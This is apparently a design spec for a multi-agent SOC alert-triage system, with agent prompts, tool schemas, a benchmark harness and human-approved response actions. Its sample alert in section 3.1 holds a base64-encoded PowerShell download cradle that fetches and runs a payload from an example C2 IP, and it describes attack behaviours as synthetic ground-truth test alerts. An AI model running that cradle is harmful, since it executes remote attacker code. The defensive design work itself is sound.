# SOC-Claw: Multi-Agent Incident Response Coordinator

## Product Requirements Document

**Track:** 5 — Agentic Edge powered by NemoClaw (Deep Tech lane)
**Author:** Snigdha
**Date:** April 2026
**Version:** 3.0

---

## 1. What we're building

SOC-Claw is a three-agent incident response system that automates security alert triage, verification, and response planning. It runs inside a NemoClaw sandbox with privacy-routed inference via vLLM + Nemotron.

**Agent 1 — Triage Agent:** Ingests raw SIEM alerts, enriches them via tool calls (IP reputation, MITRE ATT&CK lookup, asset CMDB), and produces a severity score (P1–P4) with confidence and reasoning. This is the only agent with tools.

**Agent 2 — Verifier Agent:** Acts as a senior analyst quality check. Receives the raw alert + Triage Agent's verdict and either confirms, adjusts, or flags the decision. No tools — it evaluates whether the reasoning is sound and the severity matches the evidence. This is the self-correction loop that improves accuracy.

**Agent 3 — Response Agent:** Receives the verified/final verdict and produces a prioritized response plan with specific next steps, reasoning for each action, and urgency levels. No tools — it recommends actions. The analyst reviews and approves each step before execution. Approved actions are then executed by the UI layer calling the tool functions.

**Why the Response Agent recommends instead of executes:**
In real SOC operations, automated containment without human approval is dangerous — isolating the wrong host can cause an outage worse than the attack. SOC-Claw keeps the human in the loop: the AI triages, verifies, and plans; the human approves and executes. This is how enterprise security teams actually want AI to work.

**Pipeline flow:**
```
Raw alert → Triage Agent (has tools) → Verifier Agent (no tools) → Response Agent (no tools)
                                            ↓                            ↓
                                     If adjusted:                  Outputs response plan
                                     Override severity             with prioritized steps
                                            ↓                            ↓
                                     If flagged:                   Analyst approves steps
                                     Pause for analyst                    ↓
                                                                   Approved actions execute
                                                                   via UI → tool functions
```

**Analyst steering:** A human analyst can inject natural language context at any point (e.g., "this is a red team exercise") and all three agents re-evaluate.

**Privacy routing:** Sensitive SOC data (internal IPs, hostnames, alert payloads) stays on local Nemotron inference. Only generic threat intel queries route to cloud.

**LLM:** Both local and cloud paths use NVIDIA Nemotron (nvidia/nemotron-3-super-120b-a12b) served via vLLM. Same model, different locations. The privacy router controls where data goes, not which model runs.

---

## 2. Project structure

Build this exact folder structure:

```
soc-claw/
├── agents/
│   ├── triage_agent.py          # Triage Agent logic + system prompt (HAS tools)
│   ├── verifier_agent.py        # Verifier Agent logic + system prompt (NO tools)
│   └── response_agent.py        # Response Agent logic + system prompt (NO tools)
├── tools/
│   ├── ip_reputation.py         # IP threat intel lookup tool (used by Triage Agent)
│   ├── mitre_lookup.py          # MITRE ATT&CK technique mapper (used by Triage Agent)
│   ├── asset_lookup.py          # Asset inventory/CMDB lookup (used by Triage Agent)
│   └── response_tools.py        # EDR, firewall, ticketing, escalation (called by UI on approval)
├── data/
│   ├── alerts.json              # 30 synthetic SIEM alerts with ground truth
│   ├── threat_intel.json        # 20 known-bad IOCs
│   ├── asset_inventory.json     # 15 hosts with criticality tiers
│   └── mitre_techniques.json    # 20 ATT&CK techniques
├── benchmark/
│   ├── harness.py               # Runs all 30 alerts, measures latency/accuracy
│   └── results/                 # Output CSVs and comparison tables
├── ui/
│   └── app.py                   # Gradio analyst interface (handles action approval + execution)
├── config/
│   ├── nemoclaw_policy.yaml     # Egress whitelist + sandbox config
│   └── privacy_routes.yaml      # Privacy router routing rules
├── pipeline.py                  # Main orchestrator: Triage → Verifier → Response
├── requirements.txt
└── README.md
```

---

## 3. Data layer — build this first

### 3.1 alerts.json

30 synthetic SIEM alerts. Each alert is a JSON object with this schema:

```json
{
  "id": "ALT-001",
  "timestamp": "2026-04-25T14:32:00Z",
  "source_ip": "10.0.4.17",
  "dest_ip": "185.220.101.42",
  "hostname": "DC-FINANCE-01",
  "rule_name": "Suspicious PowerShell Download",
  "payload": "powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADIALwBwAGEAeQBsAG8AYQBkACcAKQApAA==",
  "ground_truth": {
    "severity": "P1",
    "is_malicious": true,
    "expected_actions": ["isolate_host", "block_ioc", "escalate"]
  }
}
```

**Distribution — create exactly this mix:**

**True positives (10 alerts, IDs ALT-001 through ALT-010):**
1. PowerShell encoded download cradle hitting known C2 on domain controller
2. Credential dumping (mimikatz-like) on Active Directory server
3. Lateral movement via PsExec to multiple hosts from compromised workstation
4. Data exfiltration — large outbound transfer to external IP from database server
5. Ransomware precursor — vssadmin delete shadows + mass file rename on file server
6. Cobalt Strike beacon callback pattern from HR workstation
7. DNS tunneling to known malicious domain from developer laptop
8. Brute force success — 500 failed logins followed by successful auth on VPN gateway
9. Webshell upload detected on public-facing web server
10. Privilege escalation — service account added to Domain Admins group

**False positives (10 alerts, IDs ALT-011 through ALT-020):**
11. IT admin running legitimate PowerShell remoting for patch deployment
12. Scheduled Nessus vulnerability scan triggering IDS signatures
13. Windows Update DNS burst causing high query volume alert
14. Backup software transferring large files to offsite storage
15. Penetration testing team's authorized Nmap scan
16. Developer pulling large Docker images triggering data transfer alert
17. Help desk using legitimate remote access tool (ConnectWise)
18. SCCM pushing software updates appearing as lateral movement
19. Marketing team's bulk email campaign triggering email exfil rule
20. New monitoring agent installation generating unusual process tree

**Ambiguous (10 alerts, IDs ALT-021 through ALT-030):**
21. After-hours RDP login to finance server from unknown internal IP
22. Large file upload to personal OneDrive from engineering workstation
23. New service account created at 2 AM with no change ticket
24. PowerShell script execution on a server not typically managed via PS
25. Outbound connection to IP in a country the company doesn't operate in
26. USB mass storage device plugged into a server room workstation
27. Multiple failed SSH attempts to production server from contractor VPN
28. Unusual outbound HTTPS traffic volume from a printer/IoT device
29. TOR browser installation detected on an intern's workstation
30. Unexpected cron job added to a production Linux server

**Each alert MUST include:**
- Realistic source/destination IPs (use 10.x.x.x for internal, real-looking external IPs for malicious)
- Hostname that maps to an entry in asset_inventory.json
- Realistic rule_name matching what Splunk/Elastic would produce
- Payload field with realistic log content (encoded commands, log lines, etc.)
- Ground truth with correct severity, is_malicious boolean, and expected_actions array

### 3.2 threat_intel.json

20 IOC entries. Schema per entry:

```json
{
  "indicator": "185.220.101.42",
  "type": "ip",
  "threat_score": 95,
  "tags": ["cobalt-strike-c2", "apt29"],
  "campaigns": ["SolarStorm-2025", "DarkHalo"],
  "first_seen": "2025-08-15",
  "last_seen": "2026-04-20"
}
```

Include a mix of IPs, domains, and file hashes. Make sure the malicious dest_ips and domains in the true positive alerts appear in this database so the correlation works. Include 5 IOCs that don't match any alert (realistic noise in a threat feed).

### 3.3 asset_inventory.json

15 hosts. Schema per entry:

```json
{
  "hostname": "DC-FINANCE-01",
  "criticality": "critical",
  "business_function": "Active Directory domain controller for finance",
  "owner": "Infrastructure Team",
  "os": "Windows Server 2022",
  "last_patch": "2026-04-10",
  "network_zone": "corporate-core"
}
```

**Criticality distribution:**
- 3 critical: domain controllers, database servers, VPN gateway
- 4 high: file servers, web servers, email servers
- 5 medium: developer workstations, HR workstations, contractor VPN endpoints
- 3 low: lab machines, printers/IoT, intern workstations

Every hostname referenced in alerts.json MUST have a matching entry here.

### 3.4 mitre_techniques.json

20 ATT&CK techniques. Schema per entry:

```json
{
  "technique_id": "T1059.001",
  "name": "Command and Scripting Interpreter: PowerShell",
  "tactic": "Execution",
  "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.",
  "keywords": ["powershell", "encoded", "download", "invoke-expression", "iex"]
}
```

Include techniques covering: execution (PowerShell, PsExec), persistence (scheduled tasks, services), privilege escalation (domain admin), credential access (dumping), lateral movement (remote services), collection (data staged), exfiltration (exfil over C2, exfil over web), command and control (C2 channels, DNS tunneling), impact (ransomware, data destruction). The keywords field is used by mitre_lookup tool for matching.

---

## 4. Tools — build these second

### 4.1 Triage tools (called by Triage Agent during enrichment)

#### ip_reputation.py

```python
def ip_reputation(ip: str) -> dict:
    """
    Look up IP address against threat intelligence database.
    
    Args:
        ip: IPv4 address string
    
    Returns:
        dict with keys:
        - threat_score: int (0-100), 0 = clean, 100 = confirmed malicious
        - tags: list[str] e.g. ["cobalt-strike-c2", "apt29"]
        - campaigns: list[str] associated campaign names
        - first_seen: str ISO date or null
        - last_seen: str ISO date or null
        - verdict: str one of "malicious", "suspicious", "clean", "unknown"
    
    Implementation:
        Load threat_intel.json, match on indicator field where type == "ip".
        If no match found, return threat_score=0, tags=[], verdict="unknown".
    """
```

#### mitre_lookup.py

```python
def mitre_lookup(behavior: str) -> list[dict]:
    """
    Map observed behavior description to MITRE ATT&CK techniques.
    
    Args:
        behavior: natural language description of observed behavior
                  e.g. "powershell encoded command downloading payload from external IP"
    
    Returns:
        list of top 1-3 matching techniques, each dict with:
        - technique_id: str e.g. "T1059.001"
        - name: str
        - tactic: str
        - description: str
        - match_score: float (0-1) based on keyword overlap
    
    Implementation:
        Load mitre_techniques.json. Tokenize behavior string to lowercase words.
        For each technique, count keyword matches (technique.keywords ∩ behavior_tokens).
        Return top 3 by match count, with match_score = matches / len(keywords).
        If no matches, return empty list.
    """
```

#### asset_lookup.py

```python
def asset_lookup(hostname: str) -> dict:
    """
    Retrieve asset information from CMDB/inventory.
    
    Args:
        hostname: host identifier string
    
    Returns:
        dict with keys:
        - hostname: str
        - criticality: str one of "critical", "high", "medium", "low"
        - business_function: str
        - owner: str
        - os: str
        - last_patch: str ISO date
        - network_zone: str
        - found: bool
    
    Implementation:
        Load asset_inventory.json, match on hostname (case-insensitive).
        If not found, return found=False with criticality="medium" as default
        and a note: "Unknown asset - defaulting to medium criticality".
    """
```

### 4.2 Response action tools (called by UI layer after analyst approval)

#### response_tools.py

These are NOT called by any agent. They are called by the Gradio UI when the analyst clicks "Approve" on a recommended action from the Response Agent's plan.

```python
def isolate_host(hostname: str) -> dict:
    """Simulate network isolation via EDR API."""
    # Log the action to stdout
    # Return: {"status": "success", "action": "host_isolated", "hostname": hostname, "timestamp": now}

def block_ioc(indicator: str, indicator_type: str) -> dict:
    """Simulate blocking an IOC at network perimeter."""
    # indicator_type: "ip", "domain", or "hash"
    # Log the action to stdout
    # Return: {"status": "success", "action": "ioc_blocked", "indicator": indicator, "type": indicator_type, "timestamp": now}

def create_ticket(summary: str, priority: str) -> dict:
    """Simulate creating an ITSM ticket."""
    # Generate a random ticket ID like "INC-20260425-001"
    # Log the action to stdout
    # Return: {"status": "success", "action": "ticket_created", "ticket_id": id, "summary": summary, "priority": priority, "timestamp": now}

def escalate(tier: int, message: str) -> dict:
    """Simulate escalation to higher-tier analyst."""
    # Log the action to stdout
    # Return: {"status": "success", "action": "escalated", "escalated_to": f"Tier {tier}", "message": message, "timestamp": now}
```

**Tool-agent mapping summary:**
| Tool | Called by | When |
|------|-----------|------|
| ip_reputation | Triage Agent | During enrichment (automatic) |
| mitre_lookup | Triage Agent | During enrichment (automatic) |
| asset_lookup | Triage Agent | During enrichment (automatic) |
| isolate_host | UI layer | After analyst approves the action |
| block_ioc | UI layer | After analyst approves the action |
| create_ticket | UI layer | After analyst approves the action |
| escalate | UI layer | After analyst approves the action |

---

## 5. Agents — build these third

### 5.1 Triage Agent (agents/triage_agent.py) — HAS TOOLS

**System prompt (include this exactly in the agent):**

```
You are a SOC Tier 2 security analyst performing alert triage. When given a raw security alert, you MUST follow this exact workflow:

STEP 1 — ENRICH: Call these tools to gather context:
- ip_reputation: Look up the destination IP (and source IP if external)
- asset_lookup: Look up the hostname to determine asset criticality
- mitre_lookup: Describe the observed behavior and get matching ATT&CK techniques

STEP 2 — CORRELATE: Analyze the enrichment results together:
- Does the IP reputation indicate known malicious infrastructure?
- Is the asset critical to business operations?
- Do the MITRE techniques suggest a known attack pattern or campaign?
- What is the overall threat narrative?

STEP 3 — SCORE: Assign severity using this rubric:
- P1 CRITICAL: Confirmed malicious activity on critical/high asset, active data exfiltration, or indicators matching a known APT campaign. Requires immediate containment.
- P2 HIGH: Likely malicious on medium asset, or confirmed malicious on low asset with lateral movement potential. Requires urgent investigation.
- P3 MEDIUM: Suspicious activity needing investigation, no confirmed IOCs. Anomalous but potentially legitimate behavior.
- P4 LOW: Informational, known false positive pattern, or benign activity triggering a broad detection rule.

STEP 4 — OUTPUT: Return a JSON object with exactly these fields:
{
  "severity": "P1|P2|P3|P4",
  "confidence": <int 0-100>,
  "reasoning": "<2-3 sentence explanation of your triage decision>",
  "mitre_techniques": ["T1059.001", ...],
  "iocs_found": [{"indicator": "...", "type": "ip|domain|hash", "threat_score": <int>}],
  "asset_criticality": "critical|high|medium|low",
  "recommended_urgency": "immediate|urgent|standard|monitor"
}

Be precise. Be consistent. When in doubt between two severity levels, choose the higher one — missed true positives are more costly than false escalations.
```

**Implementation details:**
- Use the model's tool-calling/function-calling capability to invoke tools
- The agent receives the full raw alert JSON as user input
- Parse the model's tool calls, execute the corresponding Python functions, feed results back
- Extract the final JSON verdict from the model's response
- If the analyst provides steering context, prepend it to the user message: "ANALYST CONTEXT: {steering_text}\n\nAlert: {alert_json}"

### 5.2 Verifier Agent (agents/verifier_agent.py) — NO TOOLS

**System prompt (include this exactly in the agent):**

```
You are a senior SOC analyst performing quality assurance on alert triage decisions. You receive a raw security alert AND the Triage Agent's verdict (severity, confidence, reasoning, enrichment data).

You do NOT have access to any tools. You do NOT re-run enrichment. You evaluate whether the Triage Agent's reasoning is sound and the severity matches the evidence it gathered.

VERIFICATION CHECKLIST — evaluate each:

1. EVIDENCE-SEVERITY ALIGNMENT:
   Does the assigned severity match the evidence?
   - P1 requires: confirmed malicious IOC + critical/high asset, OR active exfiltration, OR known APT match
   - P2 requires: likely malicious + medium asset, OR confirmed malicious + low asset with lateral movement
   - P3 requires: suspicious but unconfirmed, no confirmed IOCs
   - P4 requires: clear indicators of benign/known-FP activity
   Flag any mismatch between evidence strength and severity level.

2. REASONING COMPLETENESS:
   Did the Triage Agent consider ALL three enrichment sources?
   - IP reputation result: was it factored into the decision?
   - Asset criticality: was it weighted appropriately? (a P3 on a critical asset with any IOC is suspicious)
   - MITRE mapping: were the matched techniques considered in the threat narrative?
   Flag if any enrichment source was gathered but ignored in the reasoning.

3. LOGICAL CONSISTENCY:
   Does the reasoning chain logically lead to the stated severity?
   - High confidence (>80%) with weak evidence = inconsistent
   - P4 verdict on a critical asset with known C2 connection = red flag
   - P1 verdict with no confirmed IOCs and unknown IPs = over-escalation
   Flag logical gaps or contradictions.

4. BIAS CHECK:
   Common triage errors to watch for:
   - Anchoring: over-weighting the first piece of evidence (usually IP reputation)
   - Asset blindness: ignoring criticality tier when scoring
   - FP fatigue: under-scoring alerts that resemble common false positives but have subtle differences
   - Escalation bias: scoring everything as P1/P2 out of caution without evidence

DECISION — choose exactly one:

- CONFIRMED: The triage is sound. Severity and reasoning are consistent with the evidence. Pass through unchanged.
- ADJUSTED: The triage has a specific error. State the corrected severity and explain exactly what was wrong.
- FLAGGED: The evidence is genuinely ambiguous and you cannot confidently confirm or adjust. Pause for human analyst review.

OUTPUT exactly this JSON:
{
  "decision": "confirmed|adjusted|flagged",
  "original_severity": "P1|P2|P3|P4",
  "verified_severity": "P1|P2|P3|P4",
  "confidence_in_verification": <int 0-100>,
  "reasoning": "<2-3 sentences explaining your verification decision>",
  "issues_found": ["<specific issue 1>", "<specific issue 2>"],
  "checks_passed": ["evidence_alignment", "reasoning_completeness", "logical_consistency", "bias_check"],
  "checks_failed": [],
  "recommendation": "<what should happen next>"
}

IMPORTANT GUIDELINES:
- Be rigorous but fair. The goal is catching errors, not second-guessing every reasonable decision.
- If the triage is reasonable, confirm it quickly. Don't manufacture issues.
- When you adjust, always adjust by exactly one severity level unless there's an egregious error.
- "Flagged" should be rare — only when you genuinely cannot determine the correct severity.
- Your verification adds latency to the pipeline. Be decisive, not deliberative.
```

**Implementation details:**
- This agent receives TWO inputs: the raw alert JSON AND the Triage Agent's full output (verdict + enrichment data)
- Format the input as: "ALERT:\n{alert_json}\n\nTRIAGE VERDICT:\n{triage_result_json}"
- NO tool definitions — this agent has zero tools. It reasons over the data it receives.
- If analyst provides steering context, prepend it: "ANALYST CONTEXT: {steering_text}\n\nALERT:\n{alert_json}\n\nTRIAGE VERDICT:\n{triage_result_json}"
- Parse the JSON output and extract the decision field to determine pipeline flow

### 5.3 Response Agent (agents/response_agent.py) — NO TOOLS

**System prompt (include this exactly in the agent):**

```
You are a SOC incident responder. You receive a triaged and VERIFIED security alert with a final severity score, enrichment context, and verification status. Your job is to produce a prioritized response plan with specific next steps for the analyst to review and approve.

You do NOT execute actions directly. You RECOMMEND actions. The analyst will review each step and approve or reject it before execution. This is critical — automated containment without human approval is dangerous in production environments.

IMPORTANT: Use the "verified_severity" field, NOT the "original_severity". The Verifier Agent may have adjusted the severity. Always plan based on the verified/final verdict.

RESPONSE PLANNING BY SEVERITY:

P1 CRITICAL — Immediate containment required:
1. Isolate the affected host from the network via EDR
   - Why: prevent lateral movement and further data exfiltration
   - Urgency: execute within 5 minutes
2. Block all identified IOCs (IPs, domains, hashes) at the firewall
   - Why: cut off C2 communication and prevent reinfection
   - Urgency: execute within 10 minutes
3. Trigger forensic evidence collection (memory dump, disk image)
   - Why: preserve volatile evidence before it's lost
   - Urgency: execute within 15 minutes
4. Escalate to Tier 3 / Incident Response team
   - Why: P1 requires senior investigation and potential executive notification
   - Urgency: notify within 15 minutes
5. Create critical incident ticket with full context
   - Why: audit trail and handoff documentation

P2 HIGH — Urgent investigation required:
1. Block all identified IOCs at the firewall
   - Why: reduce exposure while investigation proceeds
   - Urgency: execute within 30 minutes
2. Create high-priority investigation ticket
   - Why: assign to Tier 2 for deep-dive analysis
3. Notify asset owner and request usage context
   - Why: may confirm or rule out legitimate activity
4. Escalate to Tier 2 with investigation brief
   - Why: needs skilled analysis beyond triage

P3 MEDIUM — Investigation needed, no immediate containment:
1. Create medium-priority investigation ticket
   - Why: queue for analyst review during normal operations
2. Add identified IOCs to watchlist (do NOT block yet)
   - Why: monitor for recurrence without disrupting operations
3. Request additional context from asset owner
   - Why: ambiguous alerts often resolve with business context
4. Schedule follow-up review in 24 hours
   - Why: ensure the alert doesn't go stale

P4 LOW — Log and monitor:
1. Create low-priority ticket for record-keeping
   - Why: audit trail, pattern detection over time
2. No containment or escalation actions needed
3. If this alert pattern recurs frequently: recommend tuning the detection rule
   - Why: reduce future false positive volume

OUTPUT exactly this JSON:
{
  "alert_id": "<from input>",
  "severity_acted_on": "<the verified severity you used>",
  "was_adjusted": <true if verifier changed the severity, false otherwise>,
  "response_plan": [
    {
      "step": 1,
      "action": "<specific action to take>",
      "action_type": "isolate_host|block_ioc|create_ticket|escalate|collect_forensics|add_to_watchlist|notify_owner|tune_rule",
      "target": "<hostname, IP, or system affected>",
      "reasoning": "<1 sentence: why this action is necessary>",
      "urgency": "immediate|within_30min|within_24hrs|when_convenient",
      "requires_approval": true|false
    }
  ],
  "incident_summary": "<2-3 sentence summary suitable for handoff to next shift or management briefing>",
  "analyst_notes": "<caveats, uncertainties, or recommended follow-up investigations>",
  "estimated_mttr_impact": "<how these actions reduce mean time to respond compared to manual triage>"
}

GUIDELINES:
- Every action must have a clear "why" — the analyst needs to understand the reasoning to make an approval decision.
- requires_approval should be TRUE for any containment action (isolate, block) and any escalation. It should be FALSE for logging-only actions (create low-priority ticket).
- Be specific in targets: "Block IP 185.220.101.42 at perimeter firewall" not "Block the bad IP."
- Include the action_type field so the UI can map each step to the correct execution function.
- If the Verifier flagged issues, reference them in analyst_notes.
```

**Implementation details:**
- This agent receives the merged final verdict (triage data + verification result) + original alert
- Format the input as: "ALERT:\n{alert_json}\n\nFINAL VERDICT:\n{merged_verdict_json}"
- NO tool definitions — this agent has zero tools. It produces a response plan only.
- If analyst provides steering context, prepend it
- Parse the JSON output and return the response_plan array to the UI

---

## 6. Pipeline orchestrator (pipeline.py)

This is the main entry point that wires all three agents together:

```python
"""
SOC-Claw Pipeline Orchestrator

Agent tool summary:
- Triage Agent: HAS tools (ip_reputation, mitre_lookup, asset_lookup)
- Verifier Agent: NO tools (reasoning only)
- Response Agent: NO tools (recommends actions, doesn't execute them)
- Response tools are called by the UI layer after analyst approval

Flow:
1. Load raw alert from alerts.json (by ID or sequential)
2. Pass alert to Triage Agent
3. Triage Agent calls its tools, produces severity verdict with enrichment data
4. Pass alert + triage verdict to Verifier Agent
5. Verifier evaluates reasoning, returns confirmed/adjusted/flagged
6. If confirmed: use triage verdict as final
7. If adjusted: use verifier's corrected severity as final
8. If flagged: pause pipeline, surface to analyst UI for manual decision
9. Merge triage + verification into final verdict
10. Pass final verdict + original alert to Response Agent
11. Response Agent produces prioritized response plan (no tool calls)
12. Return complete result with all three agent outputs + timing
13. UI displays response plan → analyst approves/rejects each step → approved steps execute via response_tools.py

Steering flow:
1. Analyst provides context string
2. Context is prepended to ALL three agents' inputs
3. Re-run entire pipeline from step 2 with steering context
4. All agents re-evaluate with the new context

Timing:
- Record timestamps at each stage for benchmark harness
- triage_start, triage_end, verify_start, verify_end, response_start, response_end
- Tool call timing is only measured for Triage Agent (the only agent with tools)
"""
```

**Key function signatures:**

```python
async def run_pipeline(alert: dict, steering_context: str = None) -> dict:
    """
    Run full triage → verify → response pipeline.
    
    Returns: {
        "alert": original alert,
        "triage_result": Triage Agent output (with enrichment data),
        "verification_result": Verifier Agent output,
        "final_verdict": the severity actually used for response planning,
        "was_adjusted": bool,
        "was_flagged": bool,
        "response_plan": Response Agent's prioritized action list (or None if flagged),
        "timing": {
            "triage_ms": int,
            "verification_ms": int,
            "response_ms": int,
            "total_ms": int
        }
    }
    """

async def run_triage(alert: dict, steering_context: str = None) -> dict:
    """Run Triage Agent only. Returns verdict JSON with enrichment data."""

async def run_verification(alert: dict, triage_result: dict, steering_context: str = None) -> dict:
    """Run Verifier Agent only. Returns verification JSON."""

async def run_response(alert: dict, final_verdict: dict, steering_context: str = None) -> dict:
    """Run Response Agent only. Returns response plan JSON (no tool execution)."""

def merge_verdict(triage_result: dict, verification_result: dict) -> dict:
    """
    Merge triage and verification into final verdict.
    
    If confirmed: use triage severity, keep all enrichment data.
    If adjusted: override severity with verifier's corrected severity,
                 keep all other triage data (enrichment, IOCs, MITRE).
    If flagged: mark as pending_review, do not proceed to response.
    """

def execute_approved_action(action: dict) -> dict:
    """
    Called by the UI when analyst clicks 'Approve' on a response plan step.
    Maps action_type to the corresponding function in response_tools.py.
    
    action_type mapping:
    - "isolate_host" → response_tools.isolate_host(target)
    - "block_ioc" → response_tools.block_ioc(target, type)
    - "create_ticket" → response_tools.create_ticket(summary, priority)
    - "escalate" → response_tools.escalate(tier, message)
    - Others (collect_forensics, add_to_watchlist, notify_owner, tune_rule) → log only
    
    Returns: tool execution result dict
    """
```

---

## 7. Benchmark harness (benchmark/harness.py)

```python
"""
Benchmark Harness

Runs all 30 alerts through the pipeline and measures:

LATENCY METRICS:
- triage_latency_ms: Time for Triage Agent (inference + tool calls)
- verification_latency_ms: Time for Verifier Agent (inference only, no tools)
- response_latency_ms: Time for Response Agent (inference only, no tools)
- e2e_latency_ms: Total pipeline time per alert (triage + verify + response plan)
- NOTE: action execution time is NOT included — that depends on analyst approval speed
- Average, p50, p95 for each

THROUGHPUT METRICS:
- alerts_per_minute: Total alerts / total time * 60
- NOTE: this measures plan generation throughput, not action execution throughput

ACCURACY METRICS (the key ones):
- triage_accuracy_raw: % where Triage Agent severity matches ground_truth BEFORE verification
- triage_accuracy_verified: % where final severity matches ground_truth AFTER verification
- accuracy_improvement: verified - raw (this is the Verifier's measurable value)
- false_positive_rate: % of known FPs correctly classified as P4
- false_negative_rate: % of known TPs classified as P3 or P4

VERIFICATION METRICS:
- confirm_rate: % of alerts where Verifier confirmed the triage
- adjust_rate: % of alerts where Verifier adjusted the severity
- flag_rate: % of alerts where Verifier flagged for human review
- adjustment_correct_rate: % of adjustments that moved severity CLOSER to ground truth

RESPONSE PLAN METRICS:
- avg_steps_per_plan: average number of recommended actions per alert
- approval_required_rate: % of steps that require analyst approval
- action_type_distribution: count of each action_type across all plans

OUTPUT:
- Print summary table to stdout
- Save detailed per-alert results to benchmark/results/run_{timestamp}.csv
- CSV columns: alert_id, ground_truth_severity, triage_severity, verified_severity,
               verification_decision, triage_correct, verified_correct,
               triage_latency_ms, verification_latency_ms, response_latency_ms,
               e2e_latency_ms, triage_confidence, verification_confidence,
               num_tool_calls, num_response_steps, num_approval_required
"""
```

---

## 8. Analyst interface (ui/app.py)

Build with **Gradio**. Four-panel layout:

### Left column — Alert feed
- Dropdown to select alert by ID (ALT-001 through ALT-030)
- Or "Auto-feed next alert" button that cycles through sequentially
- Show raw alert JSON in a code block when selected

### Center-left column — Triage results
- Status indicator: "Triaging..." → "Verifying..." → "Planning..." → "Complete"
- Enrichment data cards:
  - IP Reputation: threat_score badge (color-coded), tags, campaigns
  - Asset Info: hostname, criticality tier (color-coded badge), business function
  - MITRE Mapping: technique IDs, tactics
- Severity verdict: large P1/P2/P3/P4 badge (red/orange/yellow/green)
- Confidence bar: visual percentage
- Reasoning: the natural language explanation

### Center-right column — Verification results
- Verification decision badge: CONFIRMED (green) / ADJUSTED (amber) / FLAGGED (red)
- If ADJUSTED: show original severity → new severity with arrow and explanation
- If FLAGGED: show "Awaiting analyst review" with the Verifier's concerns
- Issues found: bullet list of specific issues (empty if confirmed)
- Checks passed/failed: visual checklist (evidence alignment ✓, reasoning completeness ✓, etc.)
- Final verdict: the severity that the Response Agent planned against (with "verified" label)

### Right column — Response plan & actions
- Section header: "Recommended response plan"
- Ordered list of recommended steps from the Response Agent, each showing:
  - Step number and action name (e.g., "Step 1: Isolate host DC-FINANCE-01")
  - Reasoning (the "why" from the Response Agent)
  - Urgency badge (immediate / within 30min / within 24hrs / when convenient)
  - If requires_approval == true: "Approve" and "Reject" buttons
  - If requires_approval == false: "Auto-approved" label (execute immediately)
  - After approval: status changes to "Executed ✓" with timestamp and tool result
  - After rejection: status changes to "Skipped ✗" with optional analyst note
- "Approve All" button for P1 scenarios where speed matters
- "Reject All" button to dismiss the entire plan
- Incident summary text block
- Analyst notes from the Response Agent
- Execution log: show tool call results for approved actions

### Bottom bar — Steering input
- Text input: "Enter analyst context to re-evaluate..."
- Submit button
- When submitted, re-runs the FULL pipeline (triage → verify → response plan) with steering context and updates all panels. Any previously approved actions are reset.
- If alert was flagged by Verifier: show "Override severity" dropdown (P1/P2/P3/P4) + "Confirm" button to manually set severity and unblock the Response Agent

### Additional UI elements
- Pipeline timer showing elapsed seconds per stage (Triage: 3.2s → Verify: 1.1s → Plan: 2.1s = Total: 6.4s)
- Privacy routing log: show which inference requests went local vs cloud
- "Run Benchmark" button that triggers the full 30-alert benchmark and shows results summary
- Accuracy comparison mini-table: "Before verification: X% → After verification: Y% (+Z%)"

---

## 9. NemoClaw configuration

### 9.1 config/nemoclaw_policy.yaml

```yaml
# NemoClaw sandbox egress policy for SOC-Claw
sandbox:
  name: soc-claw
  isolation:
    network: true
    filesystem: true
    process: true

egress:
  # Only these endpoints are reachable from inside the sandbox
  allowed:
    - description: "Mock EDR API (for approved isolate_host actions)"
      endpoint: "localhost:8001"
    - description: "Mock Firewall API (for approved block_ioc actions)"
      endpoint: "localhost:8002"
    - description: "Mock ITSM API (for approved create_ticket actions)"
      endpoint: "localhost:8003"
    - description: "vLLM local inference"
      endpoint: "localhost:8000"
  
  # Everything else is blocked
  default: deny

audit:
  log_tool_calls: true
  log_inference_requests: true
  log_routing_decisions: true
  log_egress_attempts: true
  log_action_approvals: true  # Track analyst approve/reject decisions
```

### 9.2 config/privacy_routes.yaml

```yaml
# Privacy routing policy
# Determines which inference requests stay local vs go to cloud
# Both paths use Nemotron — the router controls WHERE data goes, not WHICH model runs

local_inference:
  provider: "nemotron"
  model: "nvidia/nemotron-3-super-120b-a12b"
  endpoint: "localhost:8000"  # vLLM
  route_when:
    - pattern: "10\\.\\d+\\.\\d+\\.\\d+"  # Internal IPs
      reason: "Internal IP address detected"
    - pattern: "192\\.168\\.\\d+\\.\\d+"
      reason: "Internal IP address detected"  
    - pattern: "(DC-|SRV-|WS-|FW-|VPN-)"  # Internal hostnames
      reason: "Internal hostname detected"
    - pattern: "(payload|command_line|raw_log)"  # Alert payloads
      reason: "Alert payload content detected"
    - pattern: "(employee|user_id|email)"  # PII
      reason: "Employee identifier detected"

cloud_inference:
  provider: "nemotron"
  model: "nvidia/nemotron-3-super-120b-a12b"
  endpoint: "build.nvidia.com"
  route_when:
    - description: "Generic MITRE ATT&CK technique descriptions"
    - description: "General threat actor profiles and TTPs"
    - description: "Attack pattern analysis without org-specific context"

logging:
  log_every_decision: true
  format: "{timestamp} | {route} | {reason} | {prompt_hash}"
```

---

## 10. Key implementation notes

### Model integration
- Use vLLM serving Nemotron (nvidia/nemotron-3-super-120b-a12b) for all inference
- Both local and cloud paths use the same model — privacy router controls data location, not model selection
- Only the Triage Agent uses tool-calling/function-calling capability
- Verifier and Response agents receive text input and produce text (JSON) output — no tool schemas needed
- Format Triage Agent tool definitions as JSON schemas the model can invoke
- Parse tool call responses, execute the corresponding Python functions, feed results back as tool results

### Error handling
- If a tool call fails, the Triage Agent should note the failure and continue with available data
- If any agent doesn't return valid JSON, retry once with a reminder to output JSON
- If the Verifier returns invalid JSON, treat as "confirmed" (fail-open for the verification step)
- If the Response Agent returns invalid JSON, generate a minimal default plan based on severity
- Pipeline should never crash on a single alert — log the error and move to the next alert
- If Verifier flags an alert and no analyst is present (benchmark mode), auto-use triage severity

### Logging
- Every Triage Agent tool call logged with: timestamp, tool_name, input, output, latency_ms
- Every inference request logged with: timestamp, agent_name, prompt_hash, route (local/cloud), latency_ms
- Every verification decision logged with: timestamp, alert_id, original_severity, verified_severity, decision, issues_found
